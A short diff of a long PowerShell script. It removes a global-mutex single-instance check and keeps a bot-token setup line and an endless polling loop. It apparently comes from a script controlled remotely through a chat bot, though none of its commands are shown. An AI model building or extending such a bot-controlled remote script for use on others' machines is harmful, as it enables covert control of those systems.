@@ -1,14 +1,4 @@
-$mutexName = "Global\{D1E5A7C3-9B2F-4C8E-8A1F-WorkTest}"
-$createdNew = $false
-try {
-    $mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)
-    if (-not $createdNew) {
-        exit
-    }
-}
-catch {
-    exit
-}
+
 # =====================================================================================================================================================
 $global:token = $env:BOT_TOKEN # make sure your bot is in ONE server only
 # =============================================================== SCRIPT SETUP =========================================================================
@@ -1906,6 +1896,7 @@ while ($true) {
     }
     Sleep 3
 }
+
 
 
 
